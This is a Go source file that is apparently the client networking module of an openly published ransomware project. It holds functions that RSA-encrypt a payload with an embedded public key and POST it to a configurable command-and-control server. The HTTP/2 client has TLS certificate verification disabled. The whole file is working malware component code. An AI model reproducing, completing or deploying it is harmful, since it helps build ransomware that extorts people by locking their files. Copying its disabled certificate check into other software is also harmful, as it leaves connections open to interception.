package client

import (
	"crypto/tls"
	"net/http"
	"net/url"
	"strings"

	"github.com/mauri870/ransomware/rsa"
	"golang.org/x/net/http2"
)

var (
	// The public key file is embedded by go-bindata
	PUB_KEY_FILE = "client/public.pem"

	ServerUrl string
)

// Call the server
func CallServer(method string, endpoint string, data url.Values) (*http.Response, error) {
	req, err := http.NewRequest(method, ServerUrl+endpoint, strings.NewReader(data.Encode()))
	if err != nil {
		return new(http.Response), err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{Transport: &http2.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	res, err := client.Do(req)
	if err != nil {
		return new(http.Response), err
	}

	return res, nil
}

// Send an encrypted payload to server
func SendPayload(endpoint, payload string, data url.Values) (*http.Response, error) {
	pubkey, err := Asset(PUB_KEY_FILE)
	if err != nil {
		return nil, err
	}

	ciphertext, err := rsa.Encrypt(pubkey, []byte(payload))
	if err != nil {
		return &http.Response{}, err
	}

	data.Add("payload", string(ciphertext))
	return CallServer("POST", endpoint, data)
}
